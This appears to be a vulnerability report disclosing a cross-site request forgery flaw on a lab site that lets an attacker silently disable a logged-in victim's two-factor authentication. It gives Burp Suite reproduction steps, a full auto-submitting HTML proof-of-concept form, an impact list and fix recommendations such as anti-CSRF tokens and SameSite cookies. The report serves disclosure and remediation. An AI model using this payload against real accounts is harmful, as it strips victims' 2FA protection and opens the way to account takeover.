# Cross-Site Request Forgery (CSRF) Leading to Unauthorized Disabling of Two-Factor Authentication (2FA)

## Vulnerability Type

Cross-Site Request Forgery (CSRF)

## Summary

The application allows authenticated users to disable Two-Factor Authentication (2FA) through a POST request without implementing anti-CSRF protections.

An attacker can craft a malicious webpage that automatically submits a request on behalf of an authenticated victim, resulting in the unauthorized disabling of Two-Factor Authentication and weakening the security of the victim's account.

## Vulnerable Endpoint

```http id="9gk7nm"
https://kzlabs.in/1311.php?action=disable2fa
```

## Steps to Reproduce

1. Log in to the application.
2. Navigate to the Security Settings page.
3. Disable Two-Factor Authentication and intercept the request using Burp Suite.
4. Observe that the request does not contain a CSRF token.
5. Right-click the request and select **Engagement Tools → Generate CSRF PoC**.
6. Save the generated HTML file.
7. Open the HTML file while authenticated to the application.
8. Observe that Two-Factor Authentication is disabled automatically without user interaction.

## Payload Used

```html id="nztskn"
<html>
<body>
<form action="https://kzlabs.in/1311.php?action=disable2fa" method="POST">
<input type="submit" value="Submit request" />
</form>

<script>
history.pushState('', '', '/');
document.forms[0].submit();
</script>
</body>
</html>
```

## Impact

* Unauthorized disabling of Two-Factor Authentication
* Reduction of account security protections
* Increased risk of account takeover
* Abuse of authenticated user sessions without user consent

## Recommendations for Fix

* Implement anti-CSRF tokens for all state-changing requests
* Validate the `Origin` and `Referer` headers
* Use `SameSite=Lax` or `SameSite=Strict` cookies
* Require password confirmation before disabling 2FA
* Require a valid 2FA verification code before allowing 2FA deactivation
* Re-authenticate users before sensitive security-related actions
